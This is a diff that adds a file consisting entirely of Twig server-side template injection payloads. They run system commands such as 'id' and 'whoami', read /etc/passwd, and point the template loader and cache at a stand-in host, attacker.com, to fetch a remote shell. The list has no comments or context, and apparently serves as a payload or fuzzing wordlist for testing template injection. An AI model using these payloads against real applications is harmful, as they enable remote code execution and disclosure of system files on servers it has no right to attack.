@@ -1,0 +1,16 @@
+{{7*7}}
+{{7*'7'}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}
+{{_self.env.getFilter('cat /etc/passwd')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}
+{{_self.env.getFilter('id')}}
+{{['id']|map('system')|join}}
+{{['cat /etc/passwd']|filter('system')}}
+{{app.request.server.get('SERVER_NAME')}}
+{{_self.env.setCache('ftp://attacker.com/')}}
+{{_self.env.loadTemplate('http://attacker.com/shell')}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+{{['whoami']|map('system')}}
+{{['cat /etc/passwd']|map('passthru')}}
+{{include('http://attacker.com/shell')}}
+{{source('http://attacker.com/shell')}}
